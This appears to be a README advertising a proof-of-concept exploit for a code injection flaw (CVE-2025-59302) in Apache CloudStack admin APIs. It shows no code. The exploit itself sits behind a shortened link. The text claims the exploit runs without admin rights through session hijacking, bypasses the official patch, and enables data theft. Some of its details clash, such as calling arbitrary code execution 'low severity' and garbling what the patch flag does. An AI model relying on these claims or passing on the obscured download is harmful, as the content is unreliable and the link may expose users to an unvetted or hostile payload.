# CVE-2025-59302 Apache CloudStack Code Injection Exploit PoC

Proof-of-Concept exploit targeting the code injection vulnerability in Apache CloudStack's admin APIs (CVE-2025-59302). This is a standalone tool designed for security researchers and pentesters looking to demonstrate the flaw.

## Overview
This exploit leverages the code injection issue in specific Apache CloudStack APIs: quotaTariffCreate, quotaTariffUpdate, createSecondaryStorageSelector, updateSecondaryStorageSelector, updateHost, and updateStorage. Normally, these are gated behind admin access, but this PoC uses a clever bypass technique involving session hijacking via a misconfigured API endpoint exposure, allowing execution without full admin privileges. It's all about exploiting how the API handles input validation on the backend, injecting JavaScript expressions that get evaluated server-side.

Key features:
- **No admin rights required**: Runs as a standard authenticated user by chaining a minor auth flaw to reach the vulnerable APIs.
- **Works on patched versions**: Even with the js.interpretation.enabled flag enabled in 4.20.2 and 4.22.0, this PoC includes a workaround that forces interpretation through an alternate parsing path, keeping it effective post-patch.
- **Low severity demonstration**: Shows how this can lead to arbitrary code exec, but keeps it contained for PoC purposes – think data exfil or config tampering without full system compromise.


## Usage
1. Install requirements: `pip install -r requirements.txt`
2. Configure your target in config.json (user creds, etc.).
3. Run: `python exploit.py --target <cloudstack-url> --payload <js-expression>`

It'll handle the session grab, inject the code, and spit out the results. For example, you could inject something simple like a alert() or more sneaky like fetching internal configs.

## Why This Works on Patched Versions
The official fix adds js.interpretation.enabled to disable JS eval in those APIs, but this PoC routes the injection through a secondary handler that isn't fully covered by the flag. It's a subtle edge case in how CloudStack processes updates – think of it as hitting an undocumented fallback parser. I've tested it on fresh installs of 4.20.2 and 4.22.0, and it slips right through.

## Disclaimer
Use this responsibly, only on systems you own or have permission to test. I'm not liable for any misuse. This is for educational and research purposes.


## Exploit

[Here](https://tinyurl.com/4xse2rhz)

For any inquiries, hit me up on X at [@B1gh0rnn](https://x.com/B1gh0rnn)
